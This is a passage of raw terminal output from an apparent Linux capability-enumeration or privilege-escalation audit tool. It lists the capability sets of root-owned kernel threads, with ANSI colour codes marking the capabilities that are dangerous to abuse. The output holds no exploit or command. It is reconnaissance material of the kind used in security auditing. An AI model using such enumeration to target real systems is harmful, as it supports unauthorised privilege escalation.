  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 3 (rcu_gp) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 4 (rcu_par_gp) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 5 (slub_flushwq) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 6 (netns) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 8 (kworker/0:0H-events_highpri) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 10 (mm_percpu_wq) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 11 (rcu_tasks_rude_) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 12 (rcu_tasks_trace) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 13 (ksoftirqd/0) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
